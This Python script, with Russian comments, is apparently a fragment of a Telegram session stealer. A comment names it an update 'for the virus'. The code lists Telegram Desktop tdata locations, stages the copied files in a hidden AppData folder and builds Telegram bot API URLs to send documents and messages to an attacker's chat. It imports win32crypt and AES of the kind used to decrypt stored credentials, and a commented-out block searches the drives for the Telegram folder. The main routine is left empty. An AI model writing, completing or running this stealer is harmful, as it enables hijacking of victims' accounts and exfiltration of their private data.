import base64, datetime, json, os, shutil, sqlite3, sys, time, requests, win32crypt
from Crypto.Cipher import AES
from config import TOKEN, CHAT_ID


url_Document = f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={CHAT_ID}'
url_text = lambda text: f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={text}'

paths_Telegram = (
    'D:\\Telegram Desktop\\tdata', 'C:\\Program Files\\Telegram Desktop\\tdata',
    os.environ['USERPROFILE'] + "\\AppData\\Roaming\\Telegram Desktop\\tdata",
    'D:\\Programs\\Telegram Desktop\\tdata')  # папки где могут храниться данные телеграмма

directory_output = os.environ['USERPROFILE'] + r'\AppData\Local\tdata'  # где храняться файлы перед отправкой
current_user = os.getlogin()  # имя пользователя

user_path = os.path.expanduser('~')  # путь по имя пользователя (C:\\Users\\Admin)
path_to_thisFile = sys.argv[0]  # абсолютный путь файла
Thisfile_name = os.path.basename(path_to_thisFile)  # название этого файла


session = requests.Session()
session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'








if __name__ == '__main__':
    ...


# поиск нужной папки если ее нет в списке по умолчанию | обнова для вируса

# ignore_folders = []
# next_folder = True

# for root, dirs, files in os.walk("D:\\"):
#     dirs = [d for d in dirs if d not in ignore_folders]
#     if 'Telegram Desktop' in dirs:
#         print(os.path.join(root + '\\Telegram Desktop'))
#         next_folder = False
#         break

# ignore_folders = ['All Users', 'Default', 'Default User', 'Windows', 'ProgramData', 'Public', 'Default']

# if next_folder:
#     for root, dirs, files in os.walk("C:\\"):
#         dirs = [d for d in dirs if d not in ignore_folders]
#         if 'Telegram Desktop' in dirs:
#             print(os.path.join(root, 'Telegram Desktop'))
#             break



tg_path =  f'C:\\Users\\{current_user}\\AppData\\Local\\tdata'

for root, dirs, files in os.walk(tg_path):
    for file in files: # проверка всех файлов в текущей директории
        if os.path.getsize(file_path:=os.path.join(root, file)) > 540000:
            os.remove(file_path)



